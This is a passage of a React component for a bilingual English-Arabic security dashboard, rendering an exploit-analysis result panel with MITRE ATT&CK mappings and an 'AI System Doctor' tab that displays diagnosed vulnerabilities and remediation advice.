                </div>
              </div>

              {/* Right Analysis Breakdown */}
              <div className="lg:col-span-6">
                <AnimatePresence mode="wait">
                  {dissectionResult ? (
                    <motion.div
                      key="dissect-result"
                      initial={{ opacity: 0, scale: 0.98 }}
                      animate={{ opacity: 1, scale: 1 }}
                      className={`p-6 rounded-2xl border ${
                        theme === 'dark' ? 'bg-[#0E1012] border-white/5' : 'bg-slate-50 border-slate-200'
                      } space-y-6`}
                    >
                      <div className="flex items-center justify-between border-b pb-4 border-white/5">
                        <div>
                          <span className="text-[10px] font-mono text-white/30 uppercase tracking-widest block">Discovered Exploit Payload Type</span>
                          <span className="text-sm text-red-400 font-bold">{isRTL ? dissectionResult.threatTypeAr : dissectionResult.threatType}</span>
                        </div>
                        <span className="bg-red-500/15 text-red-500 border border-red-500/30 px-3 py-1 rounded text-[10px] font-mono font-black uppercase tracking-widest">
                          {dissectionResult.dangerLevel} ({dissectionResult.score}%)
                        </span>
                      </div>

                      {/* Technical heuristic flags */}
                      <div className="space-y-3">
                        <span className="text-[10px] font-mono text-white/30 uppercase tracking-widest block">Heuristic Threat Flags</span>
                        <div className="space-y-2">
                          {(isRTL ? dissectionResult.detectionsAr : dissectionResult.detections).map((det: string, idx: number) => (
                            <div key={idx} className="flex items-start gap-2.5 text-xs text-red-300 leading-relaxed font-medium">
                              <AlertOctagon className="w-4 h-4 mt-0.5 text-red-500 flex-shrink-0" />
                              <span>{det}</span>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* MITRE Map */}
                      <div className="border-t border-white/5 pt-4 space-y-3">
                        <span className="text-[10px] font-mono text-white/30 uppercase tracking-widest block">MITRE ATT&CK Matrix Blueprint Mapping</span>
                        <div className="grid grid-cols-2 gap-2 text-[10px] font-mono">
                          {dissectionResult.mitreMatrix.map((mitre: any, idx: number) => (
                            <div key={idx} className="p-2 rounded bg-black/15 border border-white/5 flex items-center justify-between">
                              <div className="space-y-0.5">
                                <span className="text-white/40 block text-[8px] uppercase">{mitre.tactic}</span>
                                <span className="text-white/80 font-bold">{mitre.technique}</span>
                              </div>
                              <span className={`text-[8px] px-1 rounded uppercase ${
                                mitre.status === 'verified' ? 'bg-red-500/20 text-red-400' : 'bg-amber-500/20 text-amber-400'
                              }`}>
                                {mitre.status}
                              </span>
                            </div>
                          ))}
                        </div>
                      </div>
                    </motion.div>
                  ) : (
                    <div className={`h-full flex flex-col items-center justify-center text-center p-12 border border-dashed rounded-2xl ${
                      theme === 'dark' ? 'border-white/5 text-white/15 bg-white/[0.01]' : 'border-slate-200 text-slate-400 bg-slate-50'
                    }`}>
                      <Cpu className="w-12 h-12 mb-3 text-red-500/30 animate-pulse" />
                      <p className="text-xs font-mono uppercase tracking-widest">Awaiting active exploit disassembly...</p>
                    </div>
                  )}
                </AnimatePresence>
              </div>
            </div>
          </motion.div>
        )}

        {/* TAB 4: AI SYSTEM DOCTOR */}
        {activeTab === 'doctor' && (
          <motion.div
            key="doctor"
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -15 }}
            className="space-y-6"
          >
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
              {/* Left Column: Diagnostics Input & Presets */}
              <div className="lg:col-span-5 space-y-6">
                <div className={`p-6 rounded-2xl border ${
                  theme === 'dark' ? 'bg-[#0E1012] border-white/5' : 'bg-slate-50 border-slate-200'
                } space-y-4`}>
                  
                  {/* Cardiogram Pulse & Status Indicator */}
                  <div className="flex items-center justify-between border-b border-white/5 pb-4">
                    <div className="flex items-center gap-3">
                      <div className="relative">
                        <Activity className="w-6 h-6 text-emerald-500 animate-pulse" />
                        <span className="absolute top-0 right-0 w-2 h-2 bg-emerald-500 rounded-full animate-ping" />
                      </div>
                      <div>
                        <span className="text-[10px] font-mono text-white/40 uppercase tracking-widest block">SYSTEM PULSE</span>
                        <span className="text-xs font-bold text-emerald-400">
                          {isRTL ? "النبض الأمني نشط وبصحة مستقرة" : "Sentry Pulse Active & Syncing"}
                        </span>
                      </div>
                    </div>
                    
                    <div className="w-24 h-8 flex items-center justify-center opacity-85">
                      <svg viewBox="0 0 100 30" className="w-full h-full text-emerald-500 stroke-current" fill="none" strokeWidth="2">
                        <path d="M0,15 L20,15 L25,5 L30,25 L35,15 L50,15 L53,10 L56,20 L59,15 L100,15">
                          <animate attributeName="stroke-dashoffset" values="100;0" dur="1.5s" repeatCount="indefinite" />
                        </path>
                      </svg>
                    </div>
                  </div>

                  {/* Diagnostic Template Selector */}
                  <div className="space-y-2">
                    <label className="text-[10px] font-mono text-white/40 uppercase tracking-widest block">
                      {isRTL ? "تحميل سجل حالة مسبق" : "Select Case Record Template"}
                    </label>
                    <div className="grid grid-cols-1 gap-2">
                      {Object.entries(doctorPresets).map(([key, item]) => (
                        <button
                          key={key}
                          onClick={() => handlePresetChange(key)}
                          className={`w-full text-left p-3 rounded-xl border transition-all text-xs flex items-center justify-between ${
                            selectedPreset === key
                              ? 'bg-red-500/10 border-red-500/40 text-red-400 font-bold'
                              : 'bg-black/20 border-white/5 text-white/60 hover:bg-black/30 hover:text-white'
                          } ${isRTL ? 'flex-row-reverse text-right' : ''}`}
                        >
                          <span>{item.label}</span>
                          {selectedPreset === key && <Check className="w-4 h-4 text-red-500" />}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* System Report Editor */}
                  <div className="space-y-2 pt-2">
                    <label className="text-[10px] font-mono text-white/40 uppercase tracking-widest block">
                      {isRTL ? "تقرير الفحص وتفاصيل التكوين" : "Configuration Diagnostics Editor"}
                    </label>
                    <textarea
                      value={doctorLog}
                      onChange={(e) => setDoctorLog(e.target.value)}
                      placeholder={getTxt('doctorPlaceholder')}
                      className={`w-full h-44 p-4 rounded-xl border-2 font-mono text-xs leading-relaxed ${
                        theme === 'dark' 
                          ? 'bg-[#0E1012] border-white/10 text-white/80 focus:border-red-500' 
                          : 'bg-slate-50 border-slate-200 text-slate-800 focus:border-red-500'
                      } focus:outline-none`}
                    />
                  </div>

                  {/* Action Button */}
                  <button
                    onClick={handleSystemDoctorScan}
                    disabled={!doctorLog.trim() || isDiagnosing}
                    className="w-full px-6 py-3.5 bg-red-600 hover:bg-red-500 disabled:bg-slate-800 disabled:text-slate-500 text-white rounded-xl text-xs font-black uppercase tracking-widest transition-all shadow-md active:scale-95 flex items-center justify-center gap-2"
                  >
                    {isDiagnosing ? (
                      <>
                        <RefreshCw className="w-4 h-4 animate-spin text-white" />
                        <span>{getTxt('diagnosing')}</span>
                      </>
                    ) : (
                      <>
                        <Heart className="w-4 h-4 text-white animate-pulse" />
                        <span>{getTxt('runDiagnosis')}</span>
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* Right Column: Prescription Result Display */}
              <div className="lg:col-span-7">
                <AnimatePresence mode="wait">
                  {diagnosisResult ? (
                    <motion.div
                      key="doctor-result"
                      initial={{ opacity: 0, scale: 0.98 }}
                      animate={{ opacity: 1, scale: 1 }}
                      className={`p-6 rounded-2xl border space-y-6 relative overflow-hidden ${
                        theme === 'dark' ? 'bg-[#0E1012] border-red-500/20' : 'bg-slate-50 border-slate-200'
                      }`}
                    >
                      {/* Holographic Watermark Badge */}
                      <div className="absolute -right-12 -bottom-12 w-48 h-48 rounded-full border-4 border-dashed border-red-500/5 flex items-center justify-center animate-spin-slow select-none pointer-events-none">
                        <Heart className="w-20 h-20 text-red-500/[0.02]" />
                      </div>

                      {/* Header containing Doctor Title and Vitals */}
                      <div className={`flex flex-col md:flex-row justify-between gap-4 border-b border-white/5 pb-5 ${isRTL ? 'md:flex-row-reverse text-right' : ''}`}>
                        <div>
                          <span className="text-[9px] font-mono text-red-400 bg-red-500/10 border border-red-500/20 px-2 py-0.5 rounded uppercase tracking-wider mb-2 inline-block">
                            {isRTL ? "تقرير طبي أمني معتمد" : "Verified Cyber-Medical Diagnosis"}
                          </span>
                          <h3 className="text-xl font-black text-white leading-tight">
                            {diagnosisResult.statusTitle}
                          </h3>
                          <p className="text-xs text-white/50 mt-1 max-w-md">
                            {diagnosisResult.diagnosisText}
                          </p>
                        </div>

                        {/* Health Score Progress Ring */}
                        <div className="flex items-center gap-3 self-start md:self-center">
                          <div className="relative w-16 h-16 flex items-center justify-center">
                            {/* Simple circular gauge */}
                            <svg className="w-full h-full transform -rotate-90">
                              <circle
                                cx="32"
                                cy="32"
                                r="28"
                                className="stroke-white/5 fill-none"
                                strokeWidth="5"
                              />
                              <circle
                                cx="32"
                                cy="32"
                                r="28"
                                className={`fill-none transition-all duration-1000 ${
                                  diagnosisResult.healthScore > 80 ? 'stroke-emerald-500' : diagnosisResult.healthScore > 50 ? 'stroke-amber-500' : 'stroke-red-500'
                                }`}
                                strokeWidth="5"
                                strokeDasharray={175}
                                strokeDashoffset={175 - (175 * diagnosisResult.healthScore) / 100}
                              />
                            </svg>
                            <span className="absolute text-sm font-black text-white font-mono">
                              {diagnosisResult.healthScore}%
                            </span>
                          </div>
                          <div className={isRTL ? 'text-right' : ''}>
                            <span className="text-[9px] font-mono text-white/40 uppercase tracking-widest block">
                              {isRTL ? "مؤشر حيوية النظام" : "System Vitals"}
                            </span>
                            <span className={`text-xs font-bold uppercase ${
                              diagnosisResult.overallRisk === 'Critical' || diagnosisResult.overallRisk === 'High' ? 'text-red-500' : diagnosisResult.overallRisk === 'Medium' ? 'text-amber-500' : 'text-emerald-500'
                            }`}>
                              {isRTL ? "الخطورة: " : "Risk: "}{diagnosisResult.overallRisk}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Pathologies discovered block */}
                      <div className="space-y-3">
                        <span className={`text-[10px] font-mono text-white/40 uppercase tracking-widest block ${isRTL ? 'text-right' : ''}`}>
                          {isRTL ? "الاعتلالات والثغرات النشطة" : "Detected Pathologies & Vulnerabilities"}
                        </span>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                          {diagnosisResult.vulnerabilities.map((vuln, idx) => (
                            <div key={idx} className="p-4 rounded-xl bg-black/20 border border-white/5 space-y-1.5">
                              <div className={`flex items-center justify-between gap-2 ${isRTL ? 'flex-row-reverse' : ''}`}>
                                <span className="text-xs font-bold text-white block truncate">{vuln.name}</span>
                                <span className={`text-[8px] px-1.5 py-0.5 rounded font-mono uppercase tracking-wider font-bold ${
                                  vuln.severity === 'High' ? 'bg-red-500/10 text-red-400 border border-red-500/20' : vuln.severity === 'Medium' ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20' : 'bg-blue-500/10 text-blue-400 border border-blue-500/20'
                                }`}>
                                  {vuln.severity}
                                </span>
                              </div>
                              <p className={`text-[11px] text-white/50 leading-relaxed ${isRTL ? 'text-right' : ''}`}>
                                {vuln.details}
                              </p>
                              <span className="text-[9px] font-mono text-red-400/60 block uppercase">
                                #{vuln.category}
                              </span>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Official Prescription Section */}
                      <div className={`p-5 rounded-xl border border-red-500/10 bg-red-500/[0.01] space-y-4 ${isRTL ? 'text-right' : ''}`}>
                        <div className={`flex items-center gap-2 border-b border-red-500/10 pb-2 ${isRTL ? 'flex-row-reverse' : ''}`}>
                          <ClipboardList className="w-4 h-4 text-red-500" />
                          <h4 className="text-xs font-black uppercase tracking-wider text-red-400">
                            {isRTL ? "الوصفة الطبية والعلاجية للنظام" : "Rx Security Treatment Prescription"}
                          </h4>
                        </div>

                        {/* Immediate fix instructions */}
                        <div className="space-y-1">
                          <span className="text-[10px] font-mono text-white/40 uppercase tracking-widest block">
                            {isRTL ? "الجرعة العاجلة والإصلاح الفوري" : "Immediate Healing Dose"}
                          </span>
                          <p className="text-xs text-white/80 leading-relaxed font-semibold">
                            {diagnosisResult.prescription.immediateAction}
                          </p>
                        </div>

                        {/* Preventative measures */}
                        <div className="space-y-2 pt-2 border-t border-red-500/10">
                          <span className="text-[10px] font-mono text-white/40 uppercase tracking-widest block">
                            {isRTL ? "إرشادات الوقاية المستمرة" : "Preventative Habits & Security Hygiene"}
                          </span>
                          <div className="space-y-1.5">
                            {diagnosisResult.prescription.preventativeMeasures.map((measure, idx) => (
                              <div key={idx} className={`flex items-start gap-2 text-xs text-white/60 ${isRTL ? 'flex-row-reverse text-right' : ''}`}>
                                <CheckCircle2 className="w-4 h-4 mt-0.5 text-emerald-500 flex-shrink-0" />
                                <span>{measure}</span>
                              </div>
                            ))}
                          </div>
                        </div>

                        {/* Stamp signature block */}
                        <div className={`flex items-center justify-between gap-4 pt-3 border-t border-red-500/10 text-[10px] font-mono ${isRTL ? 'flex-row-reverse' : ''}`}>
                          <div>
                            <span className="text-white/30 block uppercase">{isRTL ? "فترة العزل/المراقبة" : "Treatment Duration"}</span>
                            <span className="text-red-400 font-bold">{diagnosisResult.prescription.treatmentDuration}</span>
                          </div>
                          <div className={isRTL ? 'text-left' : 'text-right'}>
                            <span className="text-white/30 block uppercase">{isRTL ? "توقيع طبيب الحراسة" : "Security Surgeon MD"}</span>
                            <span className="text-white/80 font-bold italic">
                              {isRTL ? "د. ذئب الحراسة المعتمد" : "Dr. Sentry Wolf, AI Security MD"}
                            </span>
                          </div>
                        </div>
                      </div>
                    </motion.div>
                  ) : (
                    <div className={`h-full flex flex-col items-center justify-center text-center p-16 border border-dashed rounded-2xl ${
                      theme === 'dark' ? 'border-white/5 text-white/15 bg-white/[0.01]' : 'border-slate-200 text-slate-400 bg-slate-50'
                    }`}>
                      <Heart className="w-16 h-16 mb-4 text-red-500/30 animate-pulse" />
                      <p className="text-sm font-bold text-white/40 uppercase tracking-widest">
                        {isRTL ? "في انتظار إجراء الفحص الطبي للنظام..." : "Awaiting Neural Security Vitals Scan..."}
                      </p>
                      <p className="text-xs text-white/20 max-w-sm mt-2">
                        {isRTL 
                          ? "قم بتحميل أحد تقارير الحالات أو ادخل بيانات التهيئة المخصصة، ثم اضغط على زر الفحص للبدء"
                          : "Load a diagnostic case record from presets or write your own, then trigger the clinical scan."}
                      </p>
                    </div>
                  )}
                </AnimatePresence>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
